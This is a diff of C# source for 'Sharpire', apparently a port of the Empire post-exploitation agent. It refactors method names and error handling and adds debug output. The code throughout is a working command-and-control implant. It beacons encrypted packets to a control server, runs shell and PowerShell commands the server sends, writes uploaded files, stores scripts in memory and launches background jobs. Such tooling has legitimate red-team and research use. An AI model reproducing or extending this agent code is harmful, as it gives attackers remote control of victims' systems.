@@ -1,6 +1,5 @@
 ﻿using System;
 using System.Collections.Generic;
-using System.Collections.ObjectModel;
 using System.IO;
 using System.Linq;
 using System.Net;
@@ -104,9 +103,8 @@ namespace Sharpire
                     byte language = routingPacket[8];
                     byte metaData = routingPacket[9];
                 }
-                catch (IndexOutOfRangeException error)
-                {
-                }
+                catch (IndexOutOfRangeException) { }
+
                 byte[] extra = routingPacket.Skip(10).Take(2).ToArray();
                 UInt32 packetLength = BitConverter.ToUInt32(routingData, 12);
 
@@ -164,6 +162,7 @@ namespace Sharpire
         ////////////////////////////////////////////////////////////////////////////////
         internal void sendMessage(byte[] packets)
         {
+            Console.WriteLine("Sending");
             Byte[] ivBytes = newInitializationVector(16);
             Byte[] encryptedBytes = new byte[0];
             using (AesCryptoServiceProvider aesCrypto = new AesCryptoServiceProvider())
@@ -198,9 +197,7 @@ namespace Sharpire
                     String taskUri = taskURIs[random.Next(taskURIs.Length)];
                     Byte[] response = webClient.UploadData(controlServer + taskUri, "POST", routingPacket);
                 }
-                catch (WebException error)
-                {
-                }
+                catch (WebException) { }
             }
 
         }
@@ -227,10 +224,11 @@ namespace Sharpire
             {
                 //Change this to a switch : case
                 Int32 type = packet.type;
+                Console.WriteLine("Type: {0}", type);
                 switch (type)
                 {
                     case 1:
-                        byte[] systemInformationBytes = EmpireStager.GetSystemInformation("0", "servername");
+                        Byte[] systemInformationBytes = EmpireStager.GetSystemInformation("0", "servername");
                         String systemInformation = Encoding.ASCII.GetString(systemInformationBytes);
                         return encodePacket(1, systemInformation, packet.taskId);
                     case 2:
@@ -238,35 +236,32 @@ namespace Sharpire
                         sendMessage(encodePacket(2, message, packet.taskId));
                         Environment.Exit(0);
                         //This is still dumb
-                        return new byte[0];
+                        return new Byte[0];
                     case 40:
                         String[] parts = packet.data.Split(' ');
                         String output;
-                        if (parts.Length == 1)
-                        {
-                            output = Agent.invokeShellCommand(parts[0], "");
-                        }
+                        if (1 == parts.Length)
+                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), "");
                         else
-                        {
-                            output = Agent.invokeShellCommand(parts[0], parts[1]);
-                        }
-                        byte[] packetBytes = encodePacket(packet.type, output, packet.taskId);
+                            output = Agent.InvokeShellCommand(parts.FirstOrDefault(), String.Join(" ",parts.Skip(1).Take(parts.Length - 1).ToArray()));
+
+                        Byte[] packetBytes = encodePacket(packet.type, output, packet.taskId);
                         return packetBytes;
                     case 41:
-                        return task41(packet);
+                        return Task41(packet);
                     case 42:
-                        return task42(packet);
+                        return Task42(packet);
                     case 50:
                         List<String> runningJobs = new List<String>(jobTracking.jobs.Keys);
                         return encodePacket(packet.type, runningJobs.ToArray(), packet.taskId);
                     case 51:
                         return task51(packet);
                     case 100:
-                        return encodePacket(packet.type, Agent.runPowerShell(packet.data), packet.taskId);
+                        return encodePacket(packet.type, Agent.RunPowerShell(packet.data), packet.taskId);
                     case 101:
                         return task101(packet);
                     case 110:
-                        String jobId = jobTracking.startAgentJob(packet.data);
+                        String jobId = jobTracking.StartAgentJob(packet.data, packet.taskId);
                         return encodePacket(packet.type, "Job started: " + jobId, packet.taskId);
                     case 111:
                         return encodePacket(packet.type, "Not Implimented", packet.taskId);
@@ -291,10 +286,12 @@ namespace Sharpire
             return encodePacket(type, dataString, resultId);
         }
 
+        ////////////////////////////////////////////////////////////////////////////////
         // Check this one for UTF8 Errors
         ////////////////////////////////////////////////////////////////////////////////
-        internal byte[] encodePacket(UInt16 type, String data, UInt16 resultId)
+        internal Byte[] encodePacket(UInt16 type, String data, UInt16 resultId)
         {
+            Console.WriteLine(data);
             data = Convert.ToBase64String(Encoding.UTF8.GetBytes(data));
             byte[] packet = new Byte[12 + data.Length];
 
@@ -359,7 +356,7 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task41(PACKET packet)
+        public Byte[] Task41(PACKET packet)
         {
             try
             {
@@ -448,12 +445,28 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        private Byte[] task42(PACKET packet)
+        // Upload File to Agent
+        ////////////////////////////////////////////////////////////////////////////////
+        private Byte[] Task42(PACKET packet)
         {
+            Console.WriteLine(packet.data);
             String[] parts = packet.data.Split('|');
-            String fileName = parts[0];
+            if (2 > parts.Length)
+                return encodePacket(packet.type, "[!] Upload failed - No Delimiter", packet.taskId);
+
+            String fileName = parts.First();
             String base64Part = parts[1];
-            byte[] content = Convert.FromBase64String(base64Part);
+
+            Byte[] content;
+            try
+            {
+                content = Convert.FromBase64String(base64Part);
+            }
+            catch(FormatException ex)
+            {
+                return encodePacket(packet.type, "[!] Upload failed: " + ex.Message, packet.taskId);
+            }
+
             try
             {
                 using (FileStream fileStream = File.Open(fileName, FileMode.Create))
@@ -463,7 +476,7 @@ namespace Sharpire
                         try
                         {
                             binaryWriter.Write(content);
-                            return encodePacket(packet.type, "[*] Upload of $fileName successful", packet.taskId);
+                            return encodePacket(packet.type, "[*] Upload of " + fileName + " successful", packet.taskId);
                         }
                         catch
                         {
@@ -483,12 +496,13 @@ namespace Sharpire
         {
             try
             {
-                String output = jobTracking.jobs[packet.data].getOutput();
+                String output = jobTracking.jobs[packet.data].GetOutput();
                 if (output.Trim().Length > 0)
                 {
                     encodePacket(packet.type, output, packet.taskId);
                 }
-                jobTracking.jobs[packet.data].killThread();
+                Console.WriteLine(packet.taskId);
+                jobTracking.jobs[packet.data].KillThread();
                 return encodePacket(packet.type, "Job " + packet.data + " killed.", packet.taskId);
             }
             catch
@@ -498,30 +512,30 @@ namespace Sharpire
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task101(Coms.PACKET packet)
+        public Byte[] task101(PACKET packet)
         {
             String prefix = packet.data.Substring(0, 15);
             String extension = packet.data.Substring(15, 5);
-            String output = Agent.runPowerShell(packet.data.Substring(20));
+            String output = Agent.RunPowerShell(packet.data.Substring(20));
             return encodePacket(packet.type, prefix + extension + output, packet.taskId);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task120(Coms.PACKET packet)
+        public Byte[] task120(PACKET packet)
         {
             Random random = new Random();
             Byte[] initializationVector = new Byte[16];
             random.NextBytes(initializationVector);
-            jobTracking.importedScript = EmpireStager.aesEncrypt(sessionKeyBytes, initializationVector, Encoding.ASCII.GetBytes(packet.data));
+            jobTracking.ImportedScript = EmpireStager.aesEncrypt(sessionKeyBytes, initializationVector, Encoding.ASCII.GetBytes(packet.data));
             return encodePacket(packet.type, "Script successfully saved in memory", packet.taskId);
         }
 
         ////////////////////////////////////////////////////////////////////////////////
-        public Byte[] task121(Coms.PACKET packet)
+        public Byte[] task121(PACKET packet)
         {
-            Byte[] scriptBytes = EmpireStager.aesDecrypt(sessionKey, jobTracking.importedScript);
+            Byte[] scriptBytes = EmpireStager.aesDecrypt(sessionKey, jobTracking.ImportedScript);
             String script = Encoding.UTF8.GetString(scriptBytes);
-            String jobId = jobTracking.startAgentJob(script + ";" + packet.data);
+            String jobId = jobTracking.StartAgentJob(script + ";" + packet.data, packet.taskId);
             return encodePacket(packet.type, "Job started: " + jobId, packet.taskId);
         }
     }
